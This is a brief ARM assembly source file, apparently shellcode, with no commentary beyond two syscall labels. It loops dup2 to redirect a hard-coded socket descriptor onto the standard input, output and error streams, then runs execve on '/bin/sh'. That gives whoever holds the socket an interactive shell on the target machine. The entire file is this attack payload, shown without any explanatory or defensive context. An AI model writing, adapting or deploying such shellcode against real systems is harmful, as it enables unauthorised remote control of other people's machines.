.syntax unified
.section .text
.global _start

.set SOCKFD, 4

_start:
    movs    r0, #SOCKFD
    movs    r1, #2
    subs    r2, r2, r2
    movs    r7, #63         // dup2

loop:
    svc     0
    subs    r1, r0, #1
    bge     loop

    mov     r0, pc
    b       execve
    .ascii "/bin/sh\x00"

execve:
    push    {r0, r2}
    mov     r1, sp
    movs    r7, #11         // execve
    svc     0
